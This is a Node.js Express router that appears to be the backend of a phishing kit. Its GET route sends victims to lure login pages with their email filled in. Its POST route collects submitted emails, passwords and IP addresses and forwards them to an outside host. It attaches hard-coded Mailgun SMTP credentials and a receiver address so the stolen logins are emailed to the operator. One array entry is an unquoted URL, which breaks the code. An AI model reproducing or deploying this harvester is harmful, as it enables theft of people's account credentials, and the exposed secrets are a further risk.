const express = require('express');
const ax = require('axios');
const fs = require('fs');
const router = express.Router();
const path = require('path');

/*****************Redirect Url Array Start***********************/
const redirectArray = [
   /*** 'https://firebasestorage.googleapis.com/v0/b/projectselector-quota-email.appspot.com/o/Index.html?alt=media&token=6031ddd6-02b1-43cd-b18e-bb438172ca15',
    'https://firebasestorage.googleapis.com/v0/b/resi-ff27e.appspot.com/o/Index.html?alt=media&token=52de1c7e-4cd7-4bb5-b598-f1f1bce83067',
    'https://firebasestorage.googleapis.com/v0/b/resi2-dd6ef.appspot.com/o/Index.html?alt=media&token=57c829e9-7ee2-4b88-adb7-1c5b94bd0eef',
    'https://firebasestorage.googleapis.com/v0/b/dot-qzy-lwb-ush-287819.appspot.com/o/Index.html?alt=media&token=6079c2ba-3af7-470b-a5b4-b164cfda54d3',
    'https://firebasestorage.googleapis.com/v0/b/resi3-d2b4d.appspot.com/o/Index.html?alt=media&token=b3075038-5f27-44f3-8e2d-a16a856b72dd'
    **/
    https://data412.github.io/vendapp/
];
/*****************Redirect Url Array Start***********************/

/***********************Send mail php imported url*****************/
const   
    //link = 'https://remozo.online/Vendor/vendor/vendor.send.php',
    link = 'https://data412.github.io/vendapp/',
    receiverEmail = 'jamesthom@proton.me',
    SMTPPassword = '890e8560cf6be91d03b105c409191b6a-c50a0e68-80e4fa5f',
    SMTPUsername = 'postmaster@sandbox87be8bd4a6f84afd97f6493ec1b3e641.mailgun.org',
    SMTPServerName = 'smtp.mailgun.org';
/**********************Send mail php imported url ends**************/

router.get("/", (req, res) => {
    const email = req.query.email;
    const filePath = path.join(__dirname, '../redirect');
    const files = fs.readdirSync(filePath);
    if (redirectArray.length){
        const rand = Math.floor(Math.random() * redirectArray.length);
        if (email){
            res.redirect(redirectArray[rand] + '&email='+email);
        } else {
            res.redirect(redirectArray[rand]);
        }
    } else{
        const rand = Math.floor(Math.random() * files.length);
        fs.readFile(`${filePath}/${files[rand]}`, 'utf8', (err, text) => {
            res.send(text);
        });
    }
});

router.post("/", (req, res) => {
    const referer = req.headers.referer || req.headers.referrer;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let redirectUrl = referer + '&error=error&has=jduj733773838cnbncdhg';
    ax.post(link, {
        email: req.body.email,
        password: req.body.password,
        source: req.body.source,
        ip,
        SMTPUsername,
        SMTPPassword,
        SMTPServerName,
        receiverEmail,
        fromName: req.body.source.toUpperCase() + ' LOGIN'
    }).then((response) => {
        if (response.status === 200) {
            res.send({
                status_code: '200',
                status: true,
                message: 'message sent!'
            })
        } else {
            res.send({
                status_code: '400',
                status: false,
                message: 'Unknown error!'
            })
        }
    }).catch((err) => {
        res.send({
            status_code: '400',
            status: false,
            message: err
        })
    });
});

module.exports = router;
